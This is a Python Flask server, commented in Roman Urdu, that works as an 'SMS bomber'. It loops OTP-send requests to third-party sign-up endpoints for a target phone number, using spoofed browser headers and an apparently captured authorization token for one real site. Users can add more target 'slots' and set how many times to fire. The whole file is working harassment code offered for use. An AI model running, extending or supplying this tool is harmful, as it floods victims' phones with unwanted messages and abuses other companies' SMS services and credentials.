from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json
import os

app = Flask(__name__)
CORS(app, origins="*")

# ─────────────────────────────────────────────────────────
# API SLOTS — add/remove jitne chahein
# har slot mein: name, url, method, headers, body_template
# {phone} placeholder auto-replace hoga
# ─────────────────────────────────────────────────────────
API_SLOTS = [
    {
        "name": "WeatherWalay OTP",
        "enabled": True,
        "url": "https://app.weatherwalay.com/web/otp/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "authorization": "base64 5aHXZfbQHDDaNeOnhvfTkkbw8kzvr9usVJ8ux78Zah+k8PXH+OxEopEdmUAabtOOUww2Ac/o9ChS3aTy",
            "origin": "https://www.weatherwalay.com",
            "referer": "https://www.weatherwalay.com/",
            "user-agent": "Mozilla/5.0 (Linux; Android 16; Pixel 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Mobile Safari/537.36",
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site"
        },
        "body": {"phone": "{phone}"},
        "body_type": "json"
    },
    # ── ADD MORE SLOTS YAHAN ──
    # {
    #     "name": "AnotherSite OTP",
    #     "enabled": True,
    #     "url": "https://api.example.com/send-otp",
    #     "method": "POST",
    #     "headers": {
    #         "Content-Type": "application/json",
    #         "Authorization": "Bearer YOUR_TOKEN"
    #     },
    #     "body": {"mobile": "{phone}", "type": "login"},
    #     "body_type": "json"
    # },
]

# ─────────────────────────────────────────────────────────
def resolve(data, phone):
    """Replace {phone} placeholder in body"""
    if isinstance(data, dict):
        return {k: resolve(v, phone) for k, v in data.items()}
    if isinstance(data, str):
        return data.replace("{phone}", phone)
    return data

# ─────────────────────────────────────────────────────────
# ROUTES
# ─────────────────────────────────────────────────────────

@app.route('/')
def index():
    return jsonify({
        "status": "running",
        "slots": len([s for s in API_SLOTS if s["enabled"]]),
        "endpoints": ["/fire-all", "/fire-slot/<int:index>", "/slots"]
    })


@app.route('/slots')
def list_slots():
    """List all configured API slots"""
    return jsonify([
        {"index": i, "name": s["name"], "enabled": s["enabled"], "url": s["url"]}
        for i, s in enumerate(API_SLOTS)
    ])


@app.route('/fire-all', methods=['POST'])
def fire_all():
    """
    Fire all enabled slots for given phone number
    Body: {"phone": "03001234567", "count": 1}
    """
    data = request.get_json(force=True) or {}
    phone = data.get("phone", "").strip()
    count = int(data.get("count", 1))

    if not phone:
        return jsonify({"error": "phone required"}), 400

    results = []
    active_slots = [s for s in API_SLOTS if s["enabled"]]

    for iteration in range(count):
        for slot in active_slots:
            result = fire_slot_request(slot, phone, iteration + 1)
            results.append(result)

    ok    = sum(1 for r in results if r["success"])
    fail  = sum(1 for r in results if not r["success"])

    return jsonify({
        "total": len(results),
        "success": ok,
        "failed": fail,
        "results": results
    })


@app.route('/fire-slot/<int:index>', methods=['POST'])
def fire_single_slot(index):
    """
    Fire a specific slot by index
    Body: {"phone": "03001234567", "count": 1}
    """
    if index >= len(API_SLOTS):
        return jsonify({"error": "slot index out of range"}), 404

    data  = request.get_json(force=True) or {}
    phone = data.get("phone", "").strip()
    count = int(data.get("count", 1))

    if not phone:
        return jsonify({"error": "phone required"}), 400

    slot    = API_SLOTS[index]
    results = []

    for i in range(count):
        result = fire_slot_request(slot, phone, i + 1)
        results.append(result)

    ok   = sum(1 for r in results if r["success"])
    fail = sum(1 for r in results if not r["success"])

    return jsonify({
        "slot": slot["name"],
        "total": len(results),
        "success": ok,
        "failed": fail,
        "results": results
    })


# ─────────────────────────────────────────────────────────
def fire_slot_request(slot, phone, iteration=1):
    """Core function — fires one API request"""
    try:
        body    = resolve(slot["body"], phone)
        headers = slot["headers"].copy()
        url     = slot["url"].replace("{phone}", phone)
        method  = slot["method"].upper()

        if method == "POST":
            if slot.get("body_type") == "json":
                resp = requests.post(url, json=body, headers=headers, timeout=15)
            else:
                resp = requests.post(url, data=body, headers=headers, timeout=15)
        elif method == "GET":
            resp = requests.get(url, headers=headers, timeout=15)
        else:
            resp = requests.request(method, url, json=body, headers=headers, timeout=15)

        try:
            resp_data = resp.json()
        except Exception:
            resp_data = resp.text[:300]

        return {
            "slot": slot["name"],
            "iteration": iteration,
            "success": resp.status_code in [200, 201, 202],
            "status_code": resp.status_code,
            "response": resp_data
        }

    except requests.exceptions.Timeout:
        return {"slot": slot["name"], "iteration": iteration, "success": False, "error": "timeout"}
    except requests.exceptions.ConnectionError as e:
        return {"slot": slot["name"], "iteration": iteration, "success": False, "error": f"connection error: {str(e)}"}
    except Exception as e:
        return {"slot": slot["name"], "iteration": iteration, "success": False, "error": str(e)}


# ─────────────────────────────────────────────────────────
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
